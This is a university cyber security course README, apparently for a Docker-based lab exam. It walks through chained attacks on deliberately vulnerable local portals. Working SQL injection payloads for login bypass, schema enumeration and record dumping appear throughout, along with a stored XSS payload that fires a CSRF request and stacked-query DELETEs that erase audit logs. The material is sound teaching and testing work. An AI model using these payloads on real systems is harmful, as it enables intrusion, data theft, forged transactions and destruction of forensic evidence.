# 🌐 CSE 406 — Cyber Security Sessional
## Online 2: Ethical Hacking (SQLi ➔ Stored XSS ➔ CSRF ➔ Anti-Forensics)

> **Course:** CSE 406 · Cyber Security Sessional · January 2026  
> **Student ID:** 2105032  
> **Section:** A2  

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Multi-Service Application Architecture](#-multi-service-application-architecture)
- [The Unified Cascading Attack Pipeline](#-the-unified-cascading-attack-pipeline)
  - [Phase 1: SQL Injection & Authentication Bypass](#phase-1-sql-injection--authentication-bypass)
  - [Phase 2: Database Schema Discovery](#phase-2-database-schema-discovery)
  - [Phase 3: Sensitive Data Exfiltration](#phase-3-sensitive-data-exfiltration)
  - [Phase 4: Stored XSS Injection via Stacked Queries](#phase-4-stored-xss-injection-via-stacked-queries)
  - [Phase 5: Cross-Site Request Forgery (CSRF) Exploitation](#phase-5-cross-site-request-forgery-csrf-exploitation)
  - [Phase 6: Anti-Forensics & Audit Trail Sanitization](#phase-6-anti-forensics--audit-trail-sanitization)
- [Section-by-Section Exam Solutions](#-section-by-section-exam-solutions)
  - [Section A2 — Loan Portal & Student Chat (Live Exam Solved by 2105032)](#section-a2--loan-portal--student-chat-live-exam-solved-by-2105032)
  - [Section A1 — Library Fines Portal & Campus Marketplace](#section-a1--library-fines-portal--campus-marketplace)
  - [Section B1 — Gym Check-In Portal & Campus Forum](#section-b1--gym-check-in-portal--campus-forum)
  - [Section C1 — Course Registration Portal & Study Group Chat](#section-c1--course-registration-portal--study-group-chat)
- [Dockerized Practice Application (`Ethical-Hacking-Practice-Problem`)](#-dockerized-practice-application-ethical-hacking-practice-problem)
- [Master Exam Preparation & Reference Guides (`Practice/`)](#-master-exam-preparation--reference-guides-practice)
- [Environment Setup & Docker Cheat Sheet](#-environment-setup--docker-cheat-sheet)
- [File Layout](#-file-layout)

---

## 🌐 Overview

Modern web vulnerabilities rarely exist in isolation. Real-world adversaries combine subtle implementation flaws across multiple independent services into a **cascading multi-stage exploit**.

This laboratory focuses on an end-to-end, multi-service ethical hacking scenario simulating interconnected campus portals (e.g., student services, chat rooms, marketplaces, forums). Operating strictly as a designated attacker account within an isolated Docker environment, the objective is to:
1. **Bypass authentication** and breach the primary service via **SQL Injection**.
2. **Reconnaissance database structures** and exfiltrate all student private records via `UNION` queries.
3. **Persist client-side exploits (Stored XSS)** into database records via stacked SQL queries (`multipleStatements: true`).
4. **Weaponize cross-application trust via CSRF**: Triggering the secondary application (chat/forum) to transmit malicious payloads that force victims' browsers to execute unauthorized authenticated actions on the primary portal.
5. **Cover forensic tracks**: Sanitizing audit log tables to remove all forensic evidence associated with the attacker's activities while leaving legitimate traffic intact.

---

## 🏗 Multi-Service Application Architecture

The lab provides an intentionally vulnerable, multi-tier containerized environment orchestrated by Docker Compose:

```
                                  VICTIM BROWSER
                     ┌──────────────────────────────────────┐
                     │ Authenticated on Portal & Chat       │
                     └───────────────┬──────────────────────┘
                                     │
             1. Reads Chat Message   │   2. Browser automatically executes
             containing XSS link     │      CSRF fetch() with victim's cookies
                                     │
                                     ▼
┌─────────────────────────┐                     ┌─────────────────────────┐
│     SECONDARY APP       │                     │       PRIMARY APP       │
│  (e.g., Chat / Forum /  │                     │ (e.g., Loan / Fines /   │
│       Marketplace)      │                     │     Registration)       │
│   Port: 4001/7001/3001  │                     │   Port: 4000/7000/3000  │
└────────────▲────────────┘                     └────────────▲────────────┘
             │                                               │
             │ Attacker triggers Stored XSS                  │ Attacker breaches via
             │ that auto-posts to Secondary App              │ SQLi in login form
             │                                               │
             └───────────────────────┬───────────────────────┘
                                     │
                              ATTACKER BROWSER
                         (Account: meherun.nesa / 032)
```

Both Node.js/Express web services interface with an underlying MySQL database instance configured with `multipleStatements: true`.

---

## ⚡ The Unified Cascading Attack Pipeline

### Phase 1: SQL Injection & Authentication Bypass

* **Vulnerability Root Cause**: The login handler interpolates untrusted user input directly into SQL strings without parameterization or escaping:
  ```javascript
  const query = `SELECT * FROM users WHERE username = '${req.body.username}' AND password = '${req.body.password}'`;
  ```
* **Authentication Bypass Payload**:
  Injecting into the password field:
  ```sql
  ' OR '1'='1
  ```
  Or comment termination:
  ```sql
  admin' -- -
  ```
* **Column Count Enumeration**:
  Using `ORDER BY` to determine the exact number of columns returned by the query:
  ```sql
  ' ORDER BY 1 -- -
  ' ORDER BY 2 -- -
  ...
  ' ORDER BY 6 -- -   -- Returns 200 OK
  ' ORDER BY 7 -- -   -- Throws SQL error / fails -> Exact column count = 6
  ```

### Phase 2: Database Schema Discovery

Using `UNION SELECT` to map the backend database schema through reflection in the UI:

1. **Verify Reflected Columns**:
   ```sql
   ' UNION SELECT 1, 2, 3, 4, 5, 6 -- -
   ```
2. **Current Database Name**:
   ```sql
   ' UNION SELECT 1, 2, database(), 4, 5, 6 -- -
   ```
3. **Table Enumeration**:
   ```sql
   ' UNION SELECT 1, 2, GROUP_CONCAT(table_name), 4, 5, 6 
   FROM information_schema.tables 
   WHERE table_schema = database() -- -
   ```
4. **Column Enumeration**:
   ```sql
   ' UNION SELECT 1, 2, GROUP_CONCAT(column_name, ':', column_type), 4, 5, 6 
   FROM information_schema.columns 
   WHERE table_name = 'target_table' -- -
   ```

### Phase 3: Sensitive Data Exfiltration

Dump all confidential records (student IDs, full names, financial balances, loan amounts) in a single request:

```sql
' UNION SELECT 1, '', '', GROUP_CONCAT(student_id, ' ', first_name, ' ', last_name, ' - $', loan_amount SEPARATOR '<br>'), 5, 6 
FROM loan -- -
```

### Phase 4: Stored XSS Injection via Stacked Queries

Because the database connection pool enables `multipleStatements: true`, attackers can append second and third SQL statements separated by semicolons (`;`). 

The application renders user profile fields (e.g., `last_name`) directly into the HTML without escaping:
```javascript
res.send(`<h1>Welcome, ${row.first_name} ${row.last_name}</h1>`);
```

By executing a stacked `UPDATE` statement, the attacker embeds a persistent JavaScript payload into their own profile:

```sql
nesa-99'; UPDATE loan SET last_name = CONCAT(last_name, '<script>/* payload */</script>') WHERE student_id = 9900001; -- -
```

### Phase 5: Cross-Site Request Forgery (CSRF) Exploitation

Browsers automatically attach ambient session cookies when making cross-origin requests (`credentials: "include"`).

When the attacker logs in, the Stored XSS automatically posts a malicious message into the secondary application (Student Chat / Forum). When the victim views the message, the script fires a background `POST` request against the primary portal:

```javascript
fetch("http://localhost:7000/request-loan", {
    method: "POST",
    credentials: "include",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "amount=1000"
});
```
The primary application processes the request in the context of the authenticated victim, successfully executing the unauthorized loan or balance modification.

### Phase 6: Anti-Forensics & Audit Trail Sanitization

The primary portal logs every login attempt (timestamp, submitted credentials, IP) to a forensic `log` table. Leaving this table intact would allow incident responders to trace the attacker's IP and injected payloads.

Using stacked SQL injection through the same vulnerable input, the attacker purges only their own audit records:

```sql
nesa-99'; DELETE FROM log WHERE id = 9900001; -- -
-- Or by submitted username:
nesa-99'; DELETE FROM log WHERE submitted_username = 'meherun.nesa'; -- -
```
Legitimate audit trails for all other students remain untouched.

---

## 🏆 Section-by-Section Exam Solutions

### Section A2 — Loan Portal & Student Chat (Live Exam Solved by 2105032)

* **Spec Document:** [`A2-spec.pdf`](A2-Ethical-Hacking/A2-spec.pdf)
* **Student ID:** `2105032`
* **Target Applications:**
  * **Loan Management Portal:** `http://localhost:7000`
  * **Student Chat:** `http://localhost:7001`
* **Designated Accounts:**
  * **Attacker (9900001):** Portal: `meherun.nesa` / `nesa-99` · Chat: `chat-Meherun-99`
  * **Victim (9900002):** Portal: `shafayet.islam` / `islam-99` · Chat: `chat-Shafayet-99`

#### Step-by-Step Solved Walkthrough (from [`2105032.txt`](A2-Ethical-Hacking/2105032.txt))

1. **Task 1: SQL Injection Confirmation**
   * Target input: Password field on `http://localhost:7000/login`.
   * Payload: `nesa-99' or '1'='1`
   * Result: Successfully bypassed password check and logged into Meherun Nesa's portal.

2. **Task 2: Schema Discovery**
   * Column check: `nesa-99' order by 6 -- -` (success, 6 columns total).
   * Reflected positions: `2`, `3`, `4`, and `6`.
   * Database name: `' union select 1,'','',database(),5,'' -- -` ➔ Result: **`a2_loan`**
   * Tables: `' union select 1,'','',group_concat(table_name),5,'' from information_schema.tables where table_schema='a2_loan' -- -` ➔ Result: **`loan`**, **`log`**
   * Columns of `loan`: `student_id:int`, `first_name:varchar(50)`, `last_name:varchar(1000)`, `username:varchar(100)`, `password:varchar(100)`, `loan_amount:decimal(10,2)`
   * Columns of `log`: `id`, `submitted_username`, `submitted_password`, `attempted_at`

3. **Task 3: Complete Loan-Amount Extraction**
   * Payload:
     ```sql
     ' union select 1, '', '', group_concat(student_id, ' ', first_name, ' ', last_name, ' - ', loan_amount, '<br>'), 5, '' from loan -- -
     ```
   * Recovered loan records:
     * `9900001 Meherun Nesa - 1250.00`
     * `9900002 Shafayet Islam - 3400.50`
     * `9900003 Tanjila Ferdous - 0.00`
     * `9900004 Imran Chowdhury - 2200.75`
     * `9900005 Nadia Islam - 875.25`
     * `9900006 Rafiul Azam - 4990.00`
     * `9900007 Sabrina Yasmin - 0.00`
     * `9900008 Ashraful Alam - 1600.40`
     * `9900009 Priya Sarkar - 3120.00`
     * `9900010 Kazi Rubel - 500.00`
     * `9900011 Farzana Akhtar - 2750.60`
     * `9900012 Mohsin Reza - 4300.00`
     * `9900013 Tanvir Ahsan - 0.00`
     * `9900014 Ruksana Parvin - 1980.20`
     * `9900015 Ibrahim Khalil - 3675.90`

4. **Task 4: Persistent Browser Payload (Stored XSS)**
   * Test injection:
     ```sql
     nesa-99'; update loan set last_name = '<i>Nesa</i>' where student_id = 9900001 -- -
     ```
   * Result: Verified `Nesa` rendered in italics on portal homepage.

5. **Task 5: Cross-Application CSRF Weaponization**
   * Full stacked payload injected into loan portal password field:
     ```sql
     nesa-99';
     update loan set last_name = concat(
         last_name,
         '<script>
             fetch("http://localhost:7001/send", {
                 "credentials": "include",
                 "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                 "body": "body=%3Cscript%3Efetch(%22http://localhost:7000/request-loan%22,%7B%22credentials%22:%22include%22,%22headers%22:%7B%22Content-Type%22:%22application/x-www-form-urlencoded%22%7D,%22body%22:%22amount=1000%22,%22method%22:%22POST%22%7D);%3C/script%3E",
                 "method": "POST"
             });
         </script>'
     ) where student_id = 9900001; -- -
     ```
   * Execution Flow: When Meherun logs into the loan portal, her browser automatically sends a chat message on `http://localhost:7001/send` containing an embedded script. When victim Shafayet opens Student Chat, his browser executes the script, issuing a `POST http://localhost:7000/request-loan` with `amount=1000`, increasing his loan balance to `$4400.50`!

6. **Bonus Task: Audit Trail Sanitization**
   * Payload:
     ```sql
     nesa-99'; DELETE FROM log WHERE id = 9900001; -- -
     ```
   * All forensic traces of Meherun's malicious login attempts removed.

---

### Section A1 — Library Fines Portal & Campus Marketplace

* **Spec Document:** [`A1-spec.pdf`](A1-Ethical-Hacking/A1-spec.pdf)
* **Detailed Solution:** [`A1fullSolve.md`](A1-Ethical-Hacking/A1fullSolve.md)
* **Applications:** Library Fines Portal (`http://localhost:4000`) & Campus Marketplace (`http://localhost:4001`)
* **Key Insights & Specifics:**
  * Member ID field uses parameterized queries (`[String(memberId)]`), but the PIN field is concatenated unescaped.
  * Databases: `a1_fines` (`member`, `fine_record`, `log`) and `a1_market` (`app_user`, `listing`).
  * Fines calculation requires a `LEFT JOIN` on `fine_record` where `status = 'UNPAID'`.
  * XSS payload persisted in `member.last_name` (allocated as `VARCHAR(1200)` specifically for XSS).
  * CSRF triggers a new marketplace listing from victim's account.

---

### Section B1 — Gym Check-In Portal & Campus Forum

* **Spec Document:** [`B1-spec.pdf`](B1-Ethical-Hacking/B1-spec.pdf)
* **Solution Notes:** [`B1.txt`](B1-Ethical-Hacking/B1.txt)
* **Accounts:** Attacker `7700001` (`fit-nabila-17`), Victim `7700002` (`fit-rafi-17`)
* **Database:** `b1_gym` (`membership`, `log`)
* **Key Tasks:**
  * Schema: `membership (id, access_code, first_name, last_name, credits_remaining)`.
  * Exfiltrate all members and their remaining workout credits.
  * Stacked SQLi to inject persistent XSS into victim `7700002`'s record while keeping attacker `7700001`'s record unchanged.
  * Trigger automated gym check-in CSRF via Campus Forum.

---

### Section C1 — Course Registration Portal & Study Group Chat

* **Spec Document:** [`C1-spec.pdf`](C1-Ethical-Hacking/C1-spec.pdf)
* **Solution Notes:** [`C1.txt`](C1-Ethical-Hacking/C1.txt)
* **Accounts:** Attacker `9900001` (`reg-isha-29`), Victim `9900002` (`reg-fahim-29`)
* **Database:** `c1_registration` (`registration`, `log`)
* **Key Tasks:**
  * Schema: `registration (student_id, reg_pin, first_name, last_name, balance_due)`.
  * Exfiltrate all students' outstanding tuition balances using pagination filter `WHERE student_id > 9900030`.
  * Stored XSS via stacked query in `last_name`.
  * Force unauthorized course drop / enrollment CSRF through Study Group Chat.

---

## 🧪 Dockerized Practice Application (`Ethical-Hacking-Practice-Problem`)

This folder contains a complete reference web application pair ready to run locally:

* **Result Site (`result-site/`)**: Vulnerable student result viewing portal (port `3000`). Contains `server.js` and `db.js`.
* **Social Site (`social-site/`)**: Companion campus social network (port `3001`).
* **Database Init Scripts (`mysql-init/`)**:
  * `00-init.sql`: Sets up multi-database permissions.
  * `01-result.sql`: Creates `result_db`, student records, and grades.
  * `02-social.sql`: Creates `social_db`, users, posts, and session tables.
* **Payload Encoding Helper (`solve/encode_payload.py`)**:
  A Python utility to automatically URL-encode and escape nested JavaScript payloads for injection into SQL queries.

---

## 📚 Master Exam Preparation & Reference Guides (`Practice/`)

The `Practice/` directory provides high-yield guides compiled for quick access:

| Document | Description |
|---|---|
| [`cheatsheet.md`](Practice/cheatsheet.md) | Copy-paste SQL injection payloads, schema queries, XSS snippets, and URL encoding tricks. |
| [`full-pipeline.md`](Practice/full-pipeline.md) | Comprehensive theoretical walkthrough covering each phase of the attack chain from initial probe to final bonus. |
| [`EXAM_PREPARATION_MASTER_GUIDE.md`](Practice/EXAM_PREPARATION_MASTER_GUIDE.md) | Exhaustive exam preparation handbook detailing common pitfalls, Docker tricks, and time-saving techniques. |
| [`A2_PREDICTIONS.md`](Practice/A2_PREDICTIONS.md) | Prediction analysis of potential variations across different lab batches. |

---

## 🐳 Environment Setup & Docker Cheat Sheet

### Starting a Challenge Stack

```powershell
# 1. Navigate to the desired challenge directory
cd Online-2-Ethical-Hacking\A2-Ethical-Hacking

# 2. Load the Docker images from the tar archive
docker load --input A2-images.tar

# 3. Start all containers in the background
docker compose up -d

# 4. Verify container status and mapped ports
docker compose ps
```

### Resetting to Clean Seeded State

If a payload corrupts the database or you wish to re-test the exploit chain from scratch:

```powershell
# Tear down containers and delete anonymous volumes
docker compose down -v

# Re-launch clean containers
docker compose up -d
```

---

## 📁 File Layout

```
Online-2-Ethical-Hacking/
├── readme.md                           # Comprehensive documentation (this file)
├── A1-Ethical-Hacking/                 # Section A1: Library Fines & Campus Marketplace
│   ├── A1-spec.pdf                     # Official exam specification
│   ├── A1fullSolve.md                  # Complete verified solution writeup
│   ├── compose.yaml                    # Docker Compose orchestration
│   └── A1-images.tar                   # Container images archive
├── A2-Ethical-Hacking/                 # Section A2: Loan Portal & Student Chat (Solved by 2105032)
│   ├── A2-spec.pdf                     # Official exam specification
│   ├── 2105032.txt                     # Student live submission & verified payloads
│   ├── compose.yaml                    # Docker Compose orchestration
│   └── A2-images.tar                   # Container images archive
├── B1-Ethical-Hacking/                 # Section B1: Gym Check-In & Campus Forum
│   ├── B1-spec.pdf                     # Official exam specification
│   ├── B1.txt                          # Solved queries and reproduction steps
│   ├── encode.py                       # Payload URL-encoder script
│   ├── compose.yaml                    # Docker Compose orchestration
│   └── B1-images.tar                   # Container images archive
├── C1-Ethical-Hacking/                 # Section C1: Course Registration & Study Group Chat
│   ├── C1-spec.pdf                     # Official exam specification
│   ├── C1.txt                          # Solved queries and reproduction steps
│   ├── encode.py                       # Payload URL-encoder script
│   ├── compose.yaml                    # Docker Compose orchestration
│   └── C1-images.tar                   # Container images archive
├── Ethical-Hacking-Practice-Problem/   # Fully runnable reference applications
│   ├── docker-compose.yml              # Local Docker Compose setup
│   ├── result-site/                    # Source code for primary vulnerable portal (port 3000)
│   ├── social-site/                    # Source code for secondary social portal (port 3001)
│   ├── mysql-init/                     # Database schemas and seed data
│   ├── solve/                          # Exploit scripts and payload encoders
│   └── writeup.md                      # Detailed analysis of the practice problem
└── Practice/                           # Reference cheat sheets & preparation guides
    ├── cheatsheet.md                   # Quick copy-paste payload reference
    ├── full-pipeline.md                # Comprehensive attack pipeline guide
    ├── EXAM_PREPARATION_MASTER_GUIDE.md# Master exam survival handbook
    └── A2_PREDICTIONS.md               # Pattern analysis and exam predictions
```

---

<div align="center">

*CSE 406 · Cyber Security Sessional · BUET · January 2026*

</div>

